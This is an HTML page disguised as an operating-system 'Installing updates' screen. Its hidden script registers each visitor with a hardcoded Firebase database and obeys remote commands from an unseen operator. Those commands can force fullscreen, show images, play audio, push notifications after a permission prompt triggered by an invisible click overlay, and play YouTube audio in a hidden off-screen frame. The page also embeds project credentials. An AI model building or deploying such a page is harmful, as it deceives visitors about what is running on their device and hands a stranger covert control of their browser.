<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Updating…</title>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<style>
body{margin:0;font-family:Inter,sans-serif;background:#0b0f14;color:#e9eeff}
.screen{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
.panel{width:520px;max-width:90%;text-align:center}
.title{font-size:22px;margin-bottom:8px}
.status{opacity:.85;margin-bottom:16px}
.bar{height:10px;background:#1a2446;border-radius:999px;overflow:hidden}
.bar > i{display:block;height:100%;width:40%;background:linear-gradient(90deg,#4f8cff,#6aa8ff)}
.overlay-img{position:fixed;inset:0;display:none;z-index:9999}
.overlay-img img{width:100%;height:100%;object-fit:contain;background:#000}
.click-anywhere{position:fixed;inset:0;z-index:10000;cursor:pointer}
</style>
</head>
<body>
<div class="screen">
  <div class="panel">
    <div class="title">Installing updates</div>
    <div id="status" class="status">Do not turn off your device.</div>
    <div class="bar"><i id="bar"></i></div>
  </div>
</div>
<div class="overlay-img" id="imgWrap"><img id="img" /></div>
<div class="click-anywhere" id="gate"></div>
<audio id="audio"></audio>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
  authDomain: "notify-f0a18.firebaseapp.com",
  databaseURL: "https://notify-f0a18-default-rtdb.firebaseio.com",
  projectId: "notify-f0a18",
  storageBucket: "notify-f0a18.firebasestorage.app",
  messagingSenderId: "821318407742",
  appId: "1:821318407742:web:2cb1b08140827cb9c2e36f",
  measurementId: "G-L7X6CQWHY4"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const gate = document.getElementById('gate');
gate.onclick = async ()=>{try{await Notification.requestPermission()}catch(e){};gate.remove()};
const receiverId = localStorage.rid || (localStorage.rid=crypto.randomUUID());
db.ref('receivers/'+receiverId).set({online:true,ts:Date.now()});
setInterval(()=>db.ref('receivers/'+receiverId).update({ts:Date.now()}),5000);
db.ref('commands').on('child_added', s=>{
  const c = s.val();
  console.log('Received command:', c);
  if(c.target!=='ALL' && c.target!==receiverId) return;
  run(c.command,c.payload||{});
});
function run(cmd,p){
  switch(cmd){
    case 'SET_FULLSCREEN': p.enabled?document.documentElement.requestFullscreen():document.exitFullscreen(); break;
    case 'SET_STATUS_TEXT': document.getElementById('status').textContent=p.text||''; break;
    case 'SET_PROGRESS': document.getElementById('bar').style.width=(p.value||0)+'%'; break;
    case 'SHOW_IMAGE': document.getElementById('img').src=p.base64; document.getElementById('imgWrap').style.display='block'; break;
    case 'CLEAR_IMAGE': document.getElementById('imgWrap').style.display='none'; break;
    case 'PLAY_AUDIO': document.getElementById('audio').src=p.base64; document.getElementById('audio').play().catch(()=>{}); break;
    case 'PLAY_YT': yt(p.url,p.mode); break;
    case 'NOTIFY': if(Notification.permission==='granted') new Notification(p.title||'',{body:p.body||''}); break;
    case 'SOFT_RELOAD': location.reload(); break;
    case 'RESET': location.reload(true); break;
    case 'SET_THEME': document.title=p.theme==='windows'?'Working on updates…':'Updating…'; break;
  }
}
function yt(url,mode){
  const id=(url.split('v=')[1]||'').split('&')[0];
  const f=document.createElement('iframe');
  f.src=`https://www.youtube.com/embed/${id}?autoplay=1&mute=0`;
  f.allow='autoplay';
  if(mode==='hidden'){f.style.position='fixed';f.style.left='-9999px';f.width=1;f.height=1}
  else{f.style.position='fixed';f.style.inset='0';f.style.zIndex=9000}
  document.body.appendChild(f);
}
</script>
</body>
</html>
